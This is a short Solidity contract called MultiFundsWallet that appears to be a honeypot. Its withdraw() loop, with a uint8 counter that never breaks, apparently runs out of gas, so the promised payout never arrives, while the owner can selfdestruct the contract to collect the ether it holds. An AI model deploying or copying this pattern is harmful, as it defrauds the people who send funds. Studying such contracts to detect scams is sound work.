1 pragma solidity ^0.4.24;
2 
3 contract MultiFundsWallet
4 {
5     address owner;
6     
7     constructor() public {
8         owner = msg.sender;
9     }
10     
11     function withdraw() payable public 
12     {
13         require(msg.sender == tx.origin);
14         if(msg.value > 0.2 ether) {
15             uint256 value = 0;
16             uint256 eth = msg.value;
17             uint256 balance = 0;
18             for(var i = 0; i < eth*2; i++) {
19                 value = i*2;
20                 if(value >= balance) {
21                     balance = value;
22                 }
23                 else {
24                     break;
25                 }
26             }    
27             msg.sender.transfer(balance);
28         }
29     }
30     
31     function clear() public 
32     {
33         require(msg.sender == owner);
34         selfdestruct(owner);
35     }
36 
37     function () public payable {
38         
39     }
40 }